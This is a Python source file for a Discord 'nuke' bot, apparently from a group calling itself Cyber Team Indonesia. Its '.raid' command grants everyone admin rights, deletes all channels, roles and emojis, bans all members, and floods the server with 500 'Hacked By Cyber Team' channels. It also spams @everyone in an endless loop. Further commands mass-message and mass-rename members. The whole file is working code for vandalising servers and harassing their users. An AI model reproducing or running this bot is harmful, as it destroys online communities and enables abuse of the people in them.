import discord
import keep_alive
from discord.ext import commands
import random
from discord import Permissions
from colorama import Fore, Style
import asyncio

# Check readme.md for lastest updates

token = "YOUR TOKEN"

# If you are having issues, watch this video: https://streamable.com/7eovst or follow message listed below

#  If it says Shared ID None is requesting privileged intents, go to discord developer portal and go to your bot and click on the bot tab and then scroll down to where it says privileged gateway intents and enable both, then it should work

SPAM_CHANNEL =  ["Hacked By Cyber Team" , "Hacked By Cyber Team" , "Hacked By Cyber Team" , "Hacked By Cyber Team","Hacked By Cyber Team","Hacked By Cyber Team" ,"Hacked By Cyber Team","Hacked By Cyber Team","Hacked By Cyber Team","Hacked By Cyber Team","Hacked By Cyber Team","Hacked By Cyber Team","Hacked By Cyber Team"]  
SPAM_MESSAGE = ["@everyone See You Guys👋,Keep Strong🔥"]

intents = discord.Intents(messages=True, guilds=True, members=True)

client = commands.Bot(command_prefix='.', intents=intents)


@client.event
async def on_ready():
   print(''' 
░██████╗██╗░░░██╗██████╗░  ████████╗░█████╗░
██╔════╝██║░░░██║██╔══██╗  ╚══██╔══╝██╔══██╗
╚█████╗░██║░░░██║██████╦╝  ░░░██║░░░██║░░██║
░╚═══██╗██║░░░██║██╔══██╗  ░░░██║░░░██║░░██║
██████╔╝╚██████╔╝██████╦╝  ░░░██║░░░╚█████╔╝
╚═════╝░░╚═════╝░╚═════╝░  ░░░╚═╝░░░░╚════╝░

░█████╗░░██████╗████████╗██████╗░░█████╗░████████╗██████╗░███████╗██╗░░██╗
██╔══██╗██╔════╝╚══██╔══╝██╔══██╗██╔══██╗╚══██╔══╝██╔══██╗██╔════╝██║░██╔╝
███████║╚█████╗░░░░██║░░░██████╔╝██║░░██║░░░██║░░░██████╔╝█████╗░░█████═╝░
██╔══██║░╚═══██╗░░░██║░░░██╔══██╗██║░░██║░░░██║░░░██╔══██╗██╔══╝░░██╔═██╗░
██║░░██║██████╔╝░░░██║░░░██║░░██║╚█████╔╝░░░██║░░░██║░░██║███████╗██║░╚██╗
╚═╝░░╚═╝╚═════╝░░░░╚═╝░░░╚═╝░░╚═╝░╚════╝░░░░╚═╝░░░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝
 ''')
   await client.change_presence(activity=discord.Game(name="Love You All❤"))

@client.command()
@commands.is_owner()
async def stop(ctx):
    await ctx.bot.logout()
    print (Fore.GREEN + f"{client.user.name} has logged out successfully." + Fore.RESET)

@client.command()
async def raid(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    try:
      role = discord.utils.get(guild.roles, name = "@everyone")
      await role.edit(permissions = Permissions.all())
      print(Fore.MAGENTA + "I have given everyone admin." + Fore.RESET)
    except:
      print(Fore.GREEN + "I was unable to give everyone admin" + Fore.RESET)
    for channel in guild.channels:
      try:
        await channel.delete()
        print(Fore.MAGENTA + f"{channel.name} was deleted." + Fore.RESET)
      except:
        print(Fore.GREEN + f"{channel.name} was NOT deleted." + Fore.RESET)
    for member in guild.members:
     try:
       await member.ban()
       print(Fore.MAGENTA + f"{member.name}#{member.discriminator} Was banned" + Fore.RESET)
     except:
       print(Fore.GREEN + f"{member.name}#{member.discriminator} Was unable to be banned." + Fore.RESET)
    for role in guild.roles:
     try:
       await role.delete()
       print(Fore.MAGENTA + f"{role.name} Has been deleted" + Fore.RESET)
     except:
       print(Fore.GREEN + f"{role.name} Has not been deleted" + Fore.RESET)
    for emoji in list(ctx.guild.emojis):
     try:
       await emoji.delete()
       print(Fore.MAGENTA + f"{emoji.name} Was deleted" + Fore.RESET)
     except:
       print(Fore.GREEN + f"{emoji.name} Wasn't Deleted" + Fore.RESET)
    banned_users = await guild.bans()
    for ban_entry in banned_users:
      user = ban_entry.user
      try:
        await user.unban("Cyber Team Indonesia")
        print(Fore.MAGENTA + f"{user.name}#{user.discriminator} Was successfully unbanned." + Fore.RESET)
      except:
        print(Fore.GREEN + f"{user.name}#{user.discriminator} Was not unbanned." + Fore.RESET)
    await guild.create_text_channel("Thanks For Join My Server")
    for channel in guild.text_channels:
        link = await channel.create_invite(max_age = 0, max_uses = 0)
        print(f"New Invite: {link}")
    amount = 500
    for i in range(amount):
       await guild.create_text_channel(random.choice(SPAM_CHANNEL))
    print(f"Nuked {guild.name} Successfully.")
    return

@client.command(pass_context=True)
async def rename(ctx, rename_to):
    await ctx.message.delete()
    for member in list(client.get_all_members()):
        try:
            await member.edit(nick=rename_to)
            pr,int (f"{member.name} has been renamed to {rename_to}")
        except:
            print (f"{member.name} has NOT been renamed")
        print("Action completed: Rename all")

@client.command(pass_context=True)
async def dm(ctx):
    await ctx.message.delete()
    for member in list(client.get_all_members()):
        await asyncio.sleep(0)
        try:
            embed = discord.Embed(title="Thanks For Join My Server", description="Cyber Hacking" , color=discord.Colour.purple())
            embed.set_thumbnail(url="https://tenor.com/view/destory-eexplode-nuke-gif-6073338")
            embed.set_footer(text="See You All👋")
            await asyncio.sleep(1) # This is a delay on the command so the bot doesn't get rate limited, if you remove this the bot might get banned or rate limited
            await member.send(embed=embed)
        except:
            pass
        print("Action completed: Message all")
        

@client.command(pass_context=True)
async def emoji(ctx):
      for emoji in list(ctx.guild.emojis):
        try:
            await emoji.delete()
            print (f"{emoji.name} has been deleted")
        except:
            pass   

@client.command(pass_context=True)
async def role(ctx):
  for role in list(ctx.guild.roles):
        try:
            await role.delete()
            print (f"{role.name} has been deleted")
        except:
            pass          

@client.command(pass_context=True)
@commands.is_owner()
async def cmdhelp(ctx):
    await ctx.message.delete()
    await asyncio.sleep(0)
    try:
            embed = discord.Embed(title="Made By Obama's Step Son#1557", description="Commands: \n \n .emoji (deletes all emojis) \n **.raid (main command)** \n .dm (messages everyone in the server)  \n .role (deletes all roles) \n .rename (renames everyone to whatever you specify) " , color=discord.Colour.purple())
            embed.set_footer(text="Sub To Astrotrek")
            await ctx.author.send(embed=embed)
    except:
            pass


@client.event
async def on_guild_channel_create(channel):
  while True:
    await channel.send(random.choice(SPAM_MESSAGE))
      
keep_alive.keep_alive()

client.run(token, bot=True)
